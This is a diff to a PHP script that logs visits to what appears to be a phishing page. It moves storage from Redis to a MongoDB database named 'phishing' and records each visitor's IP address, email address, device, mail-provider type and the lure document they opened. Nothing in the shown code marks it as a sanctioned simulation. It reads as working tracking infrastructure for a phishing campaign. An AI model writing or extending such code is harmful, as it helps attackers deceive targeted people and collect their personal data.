@@ -48,42 +48,24 @@ try {
     // Get IP address
     $ip = getClientIP();
 
-    // Connect to Redis
-    $redis = connectRedis();
+    // Get MongoDB connection
+    $mongo = getMongoClient();
+    $db = $mongo->phishing;
+    $visits = $db->visits;
 
     // Create visit record
-    $timestamp = round(microtime(true) * 1000);
-    $visitId = 'visit:' . $timestamp . ':' . bin2hex(random_bytes(4));
     $visitData = [
         'ip' => $ip,
         'email' => $data['email'],
         'device' => $data['device'],
         'mx_type' => $mxType,
         'document_key' => $data['document_key'] ?? 'unknown',
-        'timestamp' => date('c')
+        'timestamp' => new MongoDB\BSON\UTCDateTime()
     ];
 
-    // Store in Redis (90 days = 7776000 seconds)
-    $redis->setex($visitId, 7776000, json_encode($visitData));
-
-    // Add to global timeline
-    $redis->zadd('visits:timeline', $timestamp, $visitId);
-
-    // Group by document key
-    if (!empty($data['document_key'])) {
-        $docKey = $data['document_key'];
-        $redis->zadd("visits:key:$docKey", $timestamp, $visitId);
-        $redis->hincrby('visits:count_by_key', $docKey, 1);
-        $redis->sadd("visits:key:$docKey:emails", $data['email']);
-    }
-
-    // Global stats
-    $redis->hincrby('visits:stats:by_email', $data['email'], 1);
-    $redis->hincrby('visits:stats:by_device', $data['device'], 1);
-    $redis->hincrby('visits:stats:by_mx_type', $mxType, 1);
-    $redis->incr('visits:stats:total');
-
-    $redis->close();
+    // Insert visit
+    $result = $visits->insertOne($visitData);
+    $visitId = (string)$result->getInsertedId();
 
     echo json_encode([
         'success' => true,
@@ -91,7 +73,7 @@ try {
         'ip' => $ip,
         'mx_type' => $mxType,
         'document_key' => $data['document_key'] ?? 'unknown',
-        'timestamp' => $visitData['timestamp']
+        'timestamp' => date('c')
     ]);
 
 } catch (Exception $e) {
@@ -127,32 +109,13 @@ function getClientIP() {
     return 'unknown';
 }
 
-function connectRedis() {
-    $redisUrl = getenv('REDIS_URL');
+function getMongoClient() {
+    $mongoUri = getenv('MONGODB_URI');
     
-    if (!$redisUrl) {
-        throw new Exception('REDIS_URL not configured');
+    if (!$mongoUri) {
+        throw new Exception('MONGODB_URI not configured');
     }
 
-    // Parse Redis URL: redis://user:pass@host:port
-    $parsed = parse_url($redisUrl);
-    
-    $host = $parsed['host'] ?? 'localhost';
-    $port = $parsed['port'] ?? 6379;
-    $password = $parsed['pass'] ?? null;
-
-    $redis = new Redis();
-    
-    if (!$redis->connect($host, $port, 5)) {
-        throw new Exception('Could not connect to Redis');
-    }
-
-    if ($password) {
-        if (!$redis->auth($password)) {
-            throw new Exception('Redis authentication failed');
-        }
-    }
-
-    return $redis;
+    return new MongoDB\Client($mongoUri);
 }
 ?>
